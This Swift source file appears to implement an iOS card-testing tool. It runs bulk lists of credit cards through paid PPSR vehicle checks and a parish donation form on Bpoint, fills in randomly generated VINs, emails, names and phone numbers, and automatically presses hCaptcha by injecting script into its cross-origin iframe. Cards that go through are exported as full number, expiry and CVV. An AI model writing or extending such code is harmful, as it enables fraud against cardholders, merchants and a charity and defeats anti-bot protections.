import Foundation
import Observation
import WebKit
import UIKit
import BackgroundTasks

/// On-device PPSR automation engine that drives a WKWebView to perform
/// vehicle encumbrance checks on https://transact.ppsr.gov.au/CarCheck/.
///
/// The engine replaces the Python backend — no external server is needed.
/// Card data is held in memory only and never persisted to disk.
/// Results store masked card numbers; screenshots are saved to the temp directory.
@MainActor
@Observable
final class PpsrAutomationEngine {

    // MARK: - Observable State

    private(set) var results: [PpsrResult] = []
    private(set) var status: PpsrStatus = PpsrStatus(running: false, pid: nil)
    private(set) var progress: PpsrProgress = PpsrProgress(currentIndex: 0, totalCards: 0)
    private(set) var cards: [CardEntry] = []
    private(set) var errorMessage: String?

    /// The random email generated for the current/last run (nil if auto-generate is off).
    private(set) var currentRunEmail: String?

    /// When enabled, each run auto-generates a random email and random VINs per card,
    /// ignoring the card's VIN field and the caller-supplied email.
    var autoGenerateData: Bool = true

    /// Debug log entries from the automation flow, newest last.
    private(set) var debugLog: [String] = []

    /// True while waiting for the PPSR result page to load after clicking "Show my results".
    /// Drives the visual loading spinner overlay.
    private(set) var isWaitingForResult: Bool = false

    /// When enabled, failed cards (PAYMENT_ERROR or UNKNOWN) are automatically retried.
    var autoRetryEnabled: Bool = true

    /// Maximum number of retry attempts per card.
    var maxRetries: Int = 1

    /// When enabled, automation continues processing when the app moves to background.
    var backgroundProcessingEnabled: Bool = true

    /// Maximum seconds to wait for the PPSR response page after clicking "Show my results".
    /// PPSR shows its own "Processing Payment" / "Loading your results" animations and can
    /// take well over two minutes to return, so this must be generous.
    var resultTimeout: TimeInterval = 210

    /// Which flow the Start button runs: PPSR vehicle checks or the Bpoint payment form.
    var mode: AutomationMode = .ppsr

    /// Amount (AUD) filled into the Bpoint payment form.
    var bpointAmount: Int = 50

    /// True while Bpoint automation waits for the user to tick the human-verification box
    /// in the Live tab. Only set when every automatic press attempt has been exhausted.
    private(set) var needsCaptchaTap: Bool = false

    // MARK: - Private

    private var _webView: WKWebView?
    private var processTask: Task<Void, Never>?
    private var backgroundTaskId: UIBackgroundTaskIdentifier = .invalid

    /// Captcha iframes that reported in via `CaptchaBridge`. These are cross-origin frames,
    /// so they can only be scripted through `evaluateJavaScript(_:in:contentWorld:)`.
    private var captchaFrames: [WKFrameInfo] = []

    /// Latest state posted by the in-frame captcha script (`found`, `pressed`, `verified`).
    private var captchaReport: String?

    /// Retained so the web view's content controller keeps a valid handler.
    private var captchaBridge: CaptchaBridge?

    /// Exposed for the live WebView preview. Lazily created.
    var webView: WKWebView { ensureWebView() }

    private let ppsrURL = URL(string: "https://transact.ppsr.gov.au/CarCheck/")!
    private let bpointURL = URL(string: "https://www.bpoint.com.au/payments/ourladyoftheway")!

    /// Seconds to wait for the card-entry page after clicking the Visa/Mastercard logo.
    private let cardPageTimeout: TimeInterval = 30

    /// Seconds to wait for a payment receipt/decline after pressing Proceed.
    private let bpointResultTimeout: TimeInterval = 180

    /// Seconds to let the automatic captcha presser work before asking the user to tap.
    private let captchaAutoTimeout: TimeInterval = 25

    /// Seconds to wait for the user to tick the human-verification box.
    private let captchaTapTimeout: TimeInterval = 180

    // MARK: - Computed

    /// Whether automation is currently running.
    var isRunning: Bool { status.running }

    /// Aggregate stats computed from the in-memory results.
    var stats: PpsrStats {
        let total = results.count
        let success = results.filter { ResultStatus.from($0.status) == .resultsFound }.count
        let failure = results.filter { ResultStatus.from($0.status) == .paymentError }.count
        let unknown = results.filter { ResultStatus.from($0.status) == .unknown }.count
        let noResults = results.filter { ResultStatus.from($0.status) == .noResults }.count
        let rate = total > 0 ? Double(success) / Double(total) * 100.0 : 0.0
        return PpsrStats(totalProcessed: total, successCount: success,
                         failureCount: failure, unknownCount: unknown,
                         noResultsCount: noResults, successRate: rate)
    }

    // MARK: - Card Management

    /// Replaces the current card queue with a newly parsed, validated, deduplicated list.
    /// Returns the count of valid and skipped lines.
    func uploadCards(_ text: String) -> (valid: Int, skipped: Int) {
        let processed = CardFormatter.process(text)
        cards = processed.valid
        return (processed.valid.count, processed.skipped)
    }

    /// Appends a newly parsed card list to the existing queue, skipping duplicates.
    /// Returns the count of valid and skipped lines.
    func addCards(_ text: String) -> (valid: Int, skipped: Int) {
        let processed = CardFormatter.process(text)
        let existingCards = Set(cards.map(\.card))
        var validAdded = 0
        var skipped = processed.skipped

        for entry in processed.valid {
            guard !existingCards.contains(entry.card) else {
                skipped += 1
                continue
            }
            cards.append(entry)
            validAdded += 1
        }
        return (validAdded, skipped)
    }

    /// Removes the card at the given index from the queue.
    func removeCard(at index: Int) {
        guard cards.indices.contains(index) else { return }
        cards.remove(at: index)
    }

    /// Clears all cards from the queue without touching results.
    func clearCards() {
        cards = []
    }

    // MARK: - Automation Control

    /// Starts processing all loaded cards through the PPSR CarCheck flow.
    /// Each card is checked sequentially using a WKWebView.
    /// Failed cards are retried up to `maxRetries` times when `autoRetryEnabled` is on.
    func start(email: String) {
        guard !status.running else { return }
        guard !cards.isEmpty else {
            errorMessage = "No cards loaded. Upload a card list first."
            return
        }

        let cardsToProcess = cards
        let trimmedEmail = email.trimmingCharacters(in: .whitespaces)

        // Auto-generate a random email for this run if enabled
        let runEmail = autoGenerateData ? RandomDataGenerator.randomEmail() : trimmedEmail
        currentRunEmail = autoGenerateData ? runEmail : nil

        beginBackgroundTask()

        processTask = Task { [weak self] in
            guard let self else { return }
            self.status = PpsrStatus(running: true, pid: nil)
            self.progress = PpsrProgress(currentIndex: 0, totalCards: cardsToProcess.count)

            for (index, card) in cardsToProcess.enumerated() {
                if Task.isCancelled { break }
                self.progress = PpsrProgress(currentIndex: index, totalCards: cardsToProcess.count)

                var result = self.mode == .bpoint
                    ? await self.processBpointCard(card)
                    : await self.processCard(card, email: runEmail)
                var attempt = 1

                // Auto-retry ONLY when the outcome is genuinely unknown (no response page).
                // PAYMENT_ERROR is a definitive answer from PPSR \u{2014} the card was declined, and
                // re-running it just burns a minute per card for the same result.
                while self.autoRetryEnabled &&
                      ResultStatus.from(result.status) == .unknown &&
                      attempt <= self.maxRetries {
                    if Task.isCancelled { break }
                    self.log("[RETRY] Card \(result.maskedCard) attempt \(attempt)/\(self.maxRetries)")
                    result = await self.processCard(card, email: runEmail)
                    attempt += 1
                }

                self.results.append(result)
            }

            self.progress = PpsrProgress(currentIndex: cardsToProcess.count, totalCards: cardsToProcess.count)
            self.status = PpsrStatus(running: false, pid: nil)
            self.isWaitingForResult = false
            self.endBackgroundTask()
        }
    }

    /// Stops the running automation.
    func stop() {
        processTask?.cancel()
        processTask = nil
        status = PpsrStatus(running: false, pid: nil)
        isWaitingForResult = false
        needsCaptchaTap = false
        endBackgroundTask()
    }

    // MARK: - Background Processing

    /// Begins a UIKit background task to request extra execution time for processing.
    private func beginBackgroundTask() {
        guard backgroundProcessingEnabled else { return }
        endBackgroundTask()
        backgroundTaskId = UIApplication.shared.beginBackgroundTask(withName: "PPSR Automation") {
            self.endBackgroundTask()
        }
    }

    /// Ends the active UIKit background task if one is running.
    private func endBackgroundTask() {
        guard backgroundTaskId != .invalid else { return }
        UIApplication.shared.endBackgroundTask(backgroundTaskId)
        backgroundTaskId = .invalid
    }

    // MARK: - Data Management

    /// Clears all results and resets progress.
    func clearResults() {
        // Clean up screenshot files before clearing
        for result in results {
            deleteScreenshotFile(result.screenshot)
        }
        results = []
        progress = PpsrProgress(currentIndex: 0, totalCards: 0)
    }

    /// Deletes a single result and its screenshot file.
    func deleteResult(_ result: PpsrResult) {
        results.removeAll { $0.id == result.id }
        deleteScreenshotFile(result.screenshot)
    }

    /// Deletes a result at the given index and its screenshot file.
    func deleteResult(at index: Int) {
        guard results.indices.contains(index) else { return }
        let result = results.remove(at: index)
        deleteScreenshotFile(result.screenshot)
    }

    /// Removes the screenshot file from disk if it exists.
    private func deleteScreenshotFile(_ path: String?) {
        guard let path, !path.isEmpty else { return }
        try? FileManager.default.removeItem(atPath: path)
    }

    /// Plain-text listing of successful card entries, one per line, in the fixed
    /// `CARDNUMBER|MM|YY|CVV` format. Backs both the share sheet and the clipboard copy.
    func exportSuccessfulText() -> String {
        let successfulMasks = Set(
            results.filter { ResultStatus.from($0.status) == .resultsFound }
                .map { $0.card }
        )
        return cards
            .filter { successfulMasks.contains(CardFormatter.mask($0.card)) }
            .map { $0.exportLine }
            .joined(separator: "\n")
    }

    /// Generates a plain-text export of successful card entries (full card data from memory).
    func exportSuccessful() -> Data {
        exportSuccessfulText().data(using: .utf8) ?? Data()
    }

    /// Clears any error message.
    func clearError() {
        errorMessage = nil
    }

    /// Appends a timestamped entry to the debug log (max 200 entries).
    private func log(_ message: String) {
        let time = DateFormatter.debugFormatter.string(from: Date())
        debugLog.append("\(time) \(message)")
        if debugLog.count > 200 {
            debugLog.removeFirst(debugLog.count - 200)
        }
    }

    // MARK: - PPSR Automation Flow

    /// Processes a single card through the PPSR CarCheck website.
    private func processCard(_ card: CardEntry, email: String) async -> PpsrResult {
        let timestamp = ISO8601DateFormatter().string(from: Date())
        let maskedCard = CardFormatter.mask(card.card)

        // Auto-generate a random VIN for this card if enabled; otherwise use the card's VIN
        let vin = autoGenerateData ? RandomDataGenerator.randomVIN() : card.vin

        log("[STEP] Card \(maskedCard) VIN=\(vin.prefix(8))…")

        // Step 1: Load the PPSR CarCheck page
        await loadAndWait(ppsrURL)
        if Task.isCancelled {
            log("[FAIL] Cancelled during page load")
            return PpsrResult(card: maskedCard, vin: vin, email: email,
                              status: "UNKNOWN", screenshot: nil, timestamp: timestamp)
        }
        log("[OK] Page loaded")

        // Step 2: Fill VIN and click next
        let vinResult = await evalJS(fillVinJS(vin: vin)) ?? "nil"
        log("[VIN] \(vinResult)")
        try? await Task.sleep(for: .milliseconds(500))
        let clickResult = await evalJS(clickNextJS()) ?? "nil"
        log("[NEXT] \(clickResult)")
        try? await Task.sleep(for: .seconds(2))
        await waitForLoad()
        if Task.isCancelled {
            log("[FAIL] Cancelled after VIN step")
            return PpsrResult(card: maskedCard, vin: vin, email: email,
                              status: "UNKNOWN", screenshot: nil, timestamp: timestamp)
        }

        // Step 3: Fill payment details and submit
        let payResult = await evalJS(fillPaymentJS(card: card.card, mm: card.mm, yy: card.yy,
                                                    cvv: card.cvv, email: email)) ?? "nil"
        log("[PAY] \(payResult)")

        // PPSR requires the "…and acknowledge that:" declaration box before it will accept a
        // submission, and refuses silently while it is unticked.
        let tickResult = await evalJS(SubmitScript.tickConfirmations) ?? "nil"
        log("[CONFIRM] \(tickResult)")

        // Give the site's form validation time to mark the form valid before clicking.
        try? await Task.sleep(for: .milliseconds(900))

        // Click "Show my results" and confirm the page actually reacted to the click.
        let submitted = await submitAndVerify()
        if !submitted {
            // The press may have landed even though no reaction was observed, so read the page
            // before writing this off \u{2014} a definitive answer beats a pointless retry.
            let lateText = await evalJS("document.body.innerText") ?? ""
            let lateURL = await evalJS("location.href") ?? ""
            if isResultPage(text: lateText, url: lateURL) {
                let lateStatus = determineStatus(from: lateText)
                log("[STATUS] \(lateStatus) (answer already on page)")
                let lateShot = await takeScreenshot(filename: screenshotName(for: card))
                return PpsrResult(card: maskedCard, vin: vin, email: email,
                                  status: lateStatus, screenshot: lateShot, timestamp: timestamp)
            }
            log("[FAIL] Submit had no effect")
            return PpsrResult(card: maskedCard, vin: vin, email: email,
                              status: "UNKNOWN", screenshot: nil, timestamp: timestamp)
        }

        // Wait for PPSR to finish processing the payment and render the response page.
        isWaitingForResult = true
        log("[WAIT] Waiting for result…")
        let reachedResultPage = await waitForResultPage()
        isWaitingForResult = false

        if Task.isCancelled {
            log("[FAIL] Cancelled after payment step")
            return PpsrResult(card: maskedCard, vin: vin, email: email,
                              status: "UNKNOWN", screenshot: nil, timestamp: timestamp)
        }

        // Step 4: Read page content and determine status.
        // If we never landed on a response page, report UNKNOWN so the retry logic kicks in
        // rather than mis-reading the marketing copy on the form page.
        let pageText = await evalJS("document.body.innerText") ?? ""
        let determinedStatus = reachedResultPage ? determineStatus(from: pageText) : "UNKNOWN"
        log("[STATUS] \(determinedStatus)")

        // Step 5: Capture screenshot
        let screenshotPath = await takeScreenshot(filename: screenshotName(for: card))
        log("[SHOT] \(screenshotPath != nil ? "OK" : "FAILED")")

        return PpsrResult(card: maskedCard, vin: vin, email: email,
                          status: determinedStatus, screenshot: screenshotPath,
                          timestamp: timestamp)
    }

    // MARK: - Bpoint Automation Flow

    /// Processes a single card through the Bpoint payment form
    /// (https://www.bpoint.com.au/payments/ourladyoftheway).
    ///
    /// Flow: random payer details + configured amount → Visa/Mastercard logo click
    /// (brand derived from the card's first digit: 4 = Visa, 5 = Mastercard) → card-entry
    /// page (number, MM/YY, CVN) → human verification → Proceed → wait for receipt or decline.
    private func processBpointCard(_ card: CardEntry) async -> PpsrResult {
        let timestamp = ISO8601DateFormatter().string(from: Date())
        let maskedCard = CardFormatter.mask(card.card)
        func unknownResult() -> PpsrResult {
            PpsrResult(card: maskedCard, vin: "", email: "",
                       status: "UNKNOWN", screenshot: nil, timestamp: timestamp)
        }

        // Card brand from the BIN prefix — the form only accepts Visa and Mastercard.
        let cardType: String
        switch card.card.first {
        case "5": cardType = "mastercard"
        case "4": cardType = "visa"
        default:
            log("[TYPE] Card \(maskedCard) starts with '\(card.card.prefix(1))' — cannot pick Visa/Mastercard, skipping")
            return unknownResult()
        }

        log("[STEP] Bpoint \(maskedCard) type=\(cardType) amount=$\(bpointAmount)")

        // Step 1: Payer details page
        await loadAndWait(bpointURL)
        if Task.isCancelled { return unknownResult() }
        try? await Task.sleep(for: .seconds(1))

        let name = RandomDataGenerator.randomFullName()
        let contact = Bool.random() ? RandomDataGenerator.randomEmail()
                                    : RandomDataGenerator.randomPhone()
        let fill = await evalJS(BpointScript.fillPayerDetails(
            name: name, contact: contact, amount: String(bpointAmount))) ?? "nil"
        log("[PAYEE] \(fill)")
        if fill.hasPrefix("missing") {
            log("[FAIL] Payer form fields not found (\(fill))")
            return unknownResult()
        }

        // Step 2: Click the card-type logo — fires the site's own AJAX submit + redirect
        let typeClick = await evalJS(BpointScript.clickCardType(cardType)) ?? "nil"
        log("[CARDTYPE] \(typeClick)")
        if typeClick.hasPrefix("not_found") {
            log("[FAIL] Card type logo not found (\(typeClick))")
            return unknownResult()
        }

        // Step 3: Wait for the card-entry page
        guard await waitForCardPage() else {
            log("[FAIL] Card entry page never appeared")
            return unknownResult()
        }

        let cardFill = await evalJS(BpointScript.fillCardDetails(
            card: card.card.filter(\.isNumber),
            mm: card.mm.filter(\.isNumber),
            yy: card.yy.filter(\.isNumber),
            cvn: card.cvv.filter(\.isNumber))) ?? "nil"
        log("[CARDFILL] \(cardFill)")
        if cardFill.hasPrefix("missing") {
            let dump = await evalJS(BpointScript.fieldDump) ?? "nil"
            log("[CARDFILL] \(dump)")
            return unknownResult()
        }

        // Step 4: Human verification
        guard await handleCaptcha() else {
            log("[FAIL] Human verification not completed")
            return unknownResult()
        }
        if Task.isCancelled { return unknownResult() }

        // Step 5: Press Proceed and wait for an observable reaction
        var reacted: String?
        for attempt in 1...3 {
            let result = await evalJS(BpointScript.clickProceed(forceFormSubmit: attempt == 3)) ?? "nil"
            log("[PROCEED] try \(attempt)/3 \(result)")
            for _ in 0..<20 {
                if Task.isCancelled { return unknownResult() }
                try? await Task.sleep(for: .milliseconds(500))
                let state = await evalJS(BpointScript.state) ?? ""
                if state.hasPrefix("reacted") {
                    log("[PROCEED] accepted (\(state))")
                    reacted = state
                    break
                }
            }
            if reacted != nil { break }
            log("[PROCEED] no reaction — re-clicking")
        }
        guard reacted != nil else {
            let dump = await evalJS(BpointScript.fieldDump) ?? "nil"
            log("[PROCEED] \(dump)")
            return unknownResult()
        }

        // Step 6: Wait for the receipt / decline. If the terminal result page already
        // answered with unrecognized wording (reacted:done), record UNKNOWN right away —
        // never re-click or touch the receipt page (no emailing the receipt).
        isWaitingForResult = true
        let outcome = reacted == "reacted:done"
            ? "unknown"
            : await waitForBpointOutcome()
        isWaitingForResult = false

        let status: String
        switch outcome {
        case "success": status = "RESULTS_FOUND"
        case "error": status = "PAYMENT_ERROR"
        default: status = "UNKNOWN"
        }
        log("[STATUS] \(status) — moving to next card")

        let screenshotPath = await takeScreenshot(filename: screenshotName(for: card))
        log("[SHOT] \(screenshotPath != nil ? "OK" : "FAILED")")
        return PpsrResult(card: maskedCard, vin: "", email: "",
                          status: status, screenshot: screenshotPath, timestamp: timestamp)
    }

    /// Polls until the Bpoint card-entry page is on screen (after the payer-page redirect).
    /// Returns true once a visible card-number input exists.
    private func waitForCardPage() async -> Bool {
        let deadline = Date().addingTimeInterval(cardPageTimeout)
        while Date() < deadline {
            if Task.isCancelled { return false }
            while _webView?.isLoading == true && Date() < deadline {
                if Task.isCancelled { return false }
                try? await Task.sleep(for: .milliseconds(150))
            }
            let state = await evalJS(BpointScript.cardPageReady) ?? ""
            if state == "ready" {
                log("[OK] Card entry page loaded")
                try? await Task.sleep(for: .milliseconds(600))
                return true
            }
            try? await Task.sleep(for: .milliseconds(500))
        }
        return false
    }

    /// Handles the human-verification box on the card page — automatically.
    ///
    /// Three layers, escalating only when the previous one fails:
    /// 1. Main-frame tick (works when the checkbox is a plain page element).
    /// 2. Cross-origin press: the all-frames user script runs *inside* the hCaptcha iframe
    ///    and presses the anchor checkbox itself; the engine also drives that frame directly
    ///    through `evaluateJavaScript(_:in:contentWorld:)`.
    /// 3. Only if both fail (e.g. hCaptcha escalates to an image challenge) does it ask the
    ///    user to tap in the Live tab.
    ///
    /// Returns true once verification is done (or no widget is present on the page).
    private func handleCaptcha() async -> Bool {
        var state = await evalJS(BpointScript.captchaState) ?? "absent"
        if state == "verified" {
            log("[HUMAN] Already verified")
            return true
        }
        if state == "absent" {
            log("[HUMAN] No verification box on this page — skipping")
            return true
        }

        let clickResult = await evalJS(BpointScript.clickCaptcha) ?? "nil"
        log("[HUMAN] main-frame \(clickResult)")
        if clickResult == "verified" { return true }

        // Auto-press inside the cross-origin captcha frame.
        if await autoPressCaptcha() { return true }

        // Auto-press exhausted (likely an image challenge) — hand over to the user.
        needsCaptchaTap = true
        log("[HUMAN] Auto-press failed — tap the \"I am human\" box in the Live tab…")
        let deadline = Date().addingTimeInterval(captchaTapTimeout)
        while Date() < deadline {
            if Task.isCancelled {
                needsCaptchaTap = false
                return false
            }
            try? await Task.sleep(for: .milliseconds(700))
            state = await evalJS(BpointScript.captchaState) ?? ""
            if state == "verified" {
                log("[HUMAN] Verified")
                needsCaptchaTap = false
                try? await Task.sleep(for: .milliseconds(600))
                return true
            }
        }
        needsCaptchaTap = false
        log("[HUMAN] Timed out waiting for verification")
        return false
    }

    /// Presses the captcha checkbox inside its cross-origin iframe and waits for the tick.
    ///
    /// The injected all-frames script presses on its own as soon as the widget renders; this
    /// additionally drives each registered frame directly, then polls the main frame's
    /// response token until it is populated. Returns true once verified.
    private func autoPressCaptcha() async -> Bool {
        let deadline = Date().addingTimeInterval(captchaAutoTimeout)
        var pressLog: String?

        while Date() < deadline {
            if Task.isCancelled { return false }

            // Drive every captcha frame we know about.
            for frame in captchaFrames where !frame.isMainFrame {
                guard let result = await evalJS(BpointScript.tapCaptchaCheckbox, in: frame) else {
                    continue
                }
                if result != pressLog {
                    log("[HUMAN] in-frame \(result)")
                    pressLog = result
                }
                if result == "verified" {
                    log("[HUMAN] Verified automatically")
                    try? await Task.sleep(for: .milliseconds(600))
                    return true
                }
            }

            // The in-frame script reports independently of our own presses.
            if captchaReport == "verified" {
                log("[HUMAN] Verified automatically")
                try? await Task.sleep(for: .milliseconds(600))
                return true
            }

            // Authoritative check: the response token in the host page.
            if await evalJS(BpointScript.captchaState) == "verified" {
                log("[HUMAN] Verified automatically")
                try? await Task.sleep(for: .milliseconds(600))
                return true
            }

            try? await Task.sleep(for: .milliseconds(700))
        }
        return false
    }

    /// Waits for Bpoint to answer after Proceed — a receipt (`success`), a decline
    /// (`error`), a recognized terminal page without either phrase (`unknown` via
    /// `reacted:done`), or the timeout (`unknown`). Returns as soon as the response is on
    /// screen so the queue moves to the next card immediately.
    private func waitForBpointOutcome() async -> String {
        let deadline = Date().addingTimeInterval(bpointResultTimeout)
        while Date() < deadline {
            if Task.isCancelled { return "unknown" }
            while _webView?.isLoading == true && Date() < deadline {
                if Task.isCancelled { return "unknown" }
                try? await Task.sleep(for: .milliseconds(150))
            }
            let state = await evalJS(BpointScript.state) ?? ""
            if state == "reacted:success" { return "success" }
            if state == "reacted:error" { return "error" }
            if state == "reacted:done" {
                log("[WAIT] Result page shown but neither receipt nor decline recognized")
                return "unknown"
            }
            try? await Task.sleep(for: .milliseconds(500))
        }
        log("[WAIT] Timed out after \(Int(bpointResultTimeout))s — no receipt or decline")
        return "unknown"
    }

    // MARK: - WKWebView Helpers

    /// Lazily creates and returns the shared WKWebView.
    private func ensureWebView() -> WKWebView {
        if let _webView { return _webView }
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.preferences.javaScriptCanOpenWindowsAutomatically = true
        config.defaultWebpagePreferences.allowsContentJavaScript = true

        // Inject the captcha presser into EVERY frame so it also runs inside the
        // cross-origin hCaptcha iframe, which page-level JS can never reach.
        let bridge = CaptchaBridge { [weak self] event, frame in
            guard let self else { return }
            self.captchaReport = event
            if !frame.isMainFrame,
               !self.captchaFrames.contains(where: { $0 == frame }) {
                self.captchaFrames.append(frame)
            }
        }
        captchaBridge = bridge
        config.userContentController.add(bridge, name: CaptchaBridge.messageName)
        config.userContentController.addUserScript(
            WKUserScript(source: BpointScript.captchaAutoPressUserScript,
                         injectionTime: .atDocumentEnd,
                         forMainFrameOnly: false))

        let view = WKWebView(frame: CGRect(x: 0, y: 0, width: 414, height: 896),
                             configuration: config)
        view.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) " +
                               "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
        view.scrollView.minimumZoomScale = 1.0
        view.scrollView.maximumZoomScale = 1.0
        _webView = view
        return view
    }

    /// Loads a URL and waits for the page to finish loading.
    private func loadAndWait(_ url: URL) async {
        let view = ensureWebView()
        // Frames from the previous page are dead once navigation starts.
        captchaFrames.removeAll()
        captchaReport = nil
        view.load(URLRequest(url: url))
        try? await Task.sleep(for: .milliseconds(300))
        await waitForLoad()
    }

    /// Polls until the WebView finishes loading or the task is cancelled.
    private func waitForLoad() async {
        guard let _webView else { return }
        var attempts = 0
        while _webView.isLoading && attempts < 150 {
            if Task.isCancelled { return }
            try? await Task.sleep(for: .milliseconds(100))
            attempts += 1
        }
        // Settling time for JS rendering
        try? await Task.sleep(for: .milliseconds(500))
    }

    /// Phrases PPSR shows while it is still working (its own loading animations).
    /// While any of these are on screen we must keep waiting.
    private let processingMarkers = [
        "processing payment", "processing your payment", "loading your results",
        "loading results", "please wait"
    ]

    /// Returns true once the WebView has actually landed on a PPSR response page.
    /// Checked by URL first (the response lives under /CarCheck/result/...), then by
    /// phrases that only ever appear on a response page.
    private func isResultPage(text: String, url: String) -> Bool {
        let lower = text.lowercased()
        // PPSR navigates to the result URL *before* the data arrives and shows its own
        // "Loading your results" animation. While that is on screen we are not done.
        if processingMarkers.contains(where: { lower.contains($0) }) { return false }
        if url.lowercased().contains("/result") { return true }
        let pageMarkers = [
            "vehicle searched", "your reference is", "search number",
            "vehicle details not found", "download your search certificate",
            "error in payment processing", "may have been charged",
            "payment declined", "card was declined", "transaction failed",
            "your card was", "payment error"
        ]
        return pageMarkers.contains(where: { lower.contains($0) })
    }

    // MARK: - Submit

    /// Clicks "Show my results" and verifies the page actually reacted.
    ///
    /// A synthetic `element.click()` is silently ignored by the PPSR form while the site has
    /// not yet marked the form valid, so a "clicked" log line does NOT mean the form was
    /// submitted. This re-fires validation events, dispatches a full touch/pointer/mouse
    /// sequence, then waits for observable proof (processing animation, button gone, or URL
    /// change) before moving on. Escalates to a direct form submit on the final attempt.
    private func submitAndVerify() async -> Bool {
        let maxAttempts = 3
        for attempt in 1...maxAttempts {
            let forceSubmit = attempt == maxAttempts
            let clickResult = await evalJS(SubmitScript.click(forceFormSubmit: forceSubmit)) ?? "nil"
            log("[SUBMIT] try \(attempt)/\(maxAttempts) \(clickResult)")

            // Wait up to ~8s for observable proof that the click landed
            for _ in 0..<16 {
                if Task.isCancelled { return false }
                try? await Task.sleep(for: .milliseconds(500))
                let state = await evalJS(SubmitScript.state) ?? ""
                if state.hasPrefix("reacted") {
                    log("[SUBMIT] accepted (\(state))")
                    return true
                }
            }
            log("[SUBMIT] no reaction \u{2014} re-clicking")

            // Re-tick between attempts: some forms clear the declaration on a failed submit.
            let retick = await evalJS(SubmitScript.tickConfirmations) ?? "nil"
            if !retick.hasPrefix("boxes=0") {
                log("[CONFIRM] \(retick)")
            }
        }

        // Nothing worked \u{2014} record exactly what was on the page so this is diagnosable.
        let dump = await evalJS(SubmitScript.candidateDump) ?? "nil"
        log("[SUBMIT] \(dump)")
        return false
    }

    /// Waits for the PPSR response page after clicking "Show my results".
    ///
    /// PPSR renders its own "Processing Payment" then "Loading your results" animations and can
    /// take minutes to respond. The page text is completely static during that time, so we must
    /// never treat "text stopped changing" as done — we only stop on a real response page or the
    /// timeout. Returns true if a response page was reached.
    @discardableResult
    private func waitForResultPage() async -> Bool {
        guard let _webView else { return false }
        let deadline = Date().addingTimeInterval(resultTimeout)
        var announcedProcessing = false

        while Date() < deadline {
            if Task.isCancelled { return false }

            // Let any in-flight navigation finish first
            while _webView.isLoading && Date() < deadline {
                if Task.isCancelled { return false }
                try? await Task.sleep(for: .milliseconds(150))
            }

            let text = await evalJS("document.body.innerText") ?? ""
            let url = _webView.url?.absoluteString ?? ""

            if isResultPage(text: text, url: url) {
                log("[WAIT] Result page reached")
                // Let the response page finish rendering before reading/screenshotting it
                try? await Task.sleep(for: .seconds(1))
                return true
            }

            if !announcedProcessing,
               processingMarkers.contains(where: { text.lowercased().contains($0) }) {
                announcedProcessing = true
                log("[WAIT] PPSR is processing…")
            }

            try? await Task.sleep(for: .milliseconds(500))
        }

        log("[WAIT] Timed out after \(Int(resultTimeout))s — no response page")
        return false
    }

    /// Evaluates a JavaScript string and returns the result as a String.
    private func evalJS(_ js: String) async -> String? {
        guard let _webView else { return nil }
        do {
            let result = try await _webView.evaluateJavaScript(js)
            if let str = result as? String { return str }
            if let num = result as? NSNumber { return num.stringValue }
            return nil
        } catch {
            return nil
        }
    }

    /// Evaluates JavaScript inside a specific frame — the only way to script a cross-origin
    /// iframe such as the hCaptcha widget. Returns nil if the frame is no longer valid.
    private func evalJS(_ js: String, in frame: WKFrameInfo) async -> String? {
        guard let _webView else { return nil }
        do {
            let result = try await _webView.evaluateJavaScript(js, in: frame,
                                                               contentWorld: .page)
            if let str = result as? String { return str }
            if let num = result as? NSNumber { return num.stringValue }
            return nil
        } catch {
            return nil
        }
    }

    /// Captures a WKWebView screenshot and saves it to the temp directory.
    /// Returns the file path, or nil if the capture failed.
    private func takeScreenshot(filename: String) async -> String? {
        let view = ensureWebView()
        let image: UIImage? = await withCheckedContinuation { continuation in
            view.takeSnapshot(with: nil) { img, _ in
                continuation.resume(returning: img)
            }
        }
        guard let image, let data = image.pngData() else { return nil }

        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("ppsr_screenshots", isDirectory: true)
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let url = dir.appendingPathComponent("\(filename).png")
        do {
            try data.write(to: url, options: .atomic)
            return url.path
        } catch {
            return nil
        }
    }

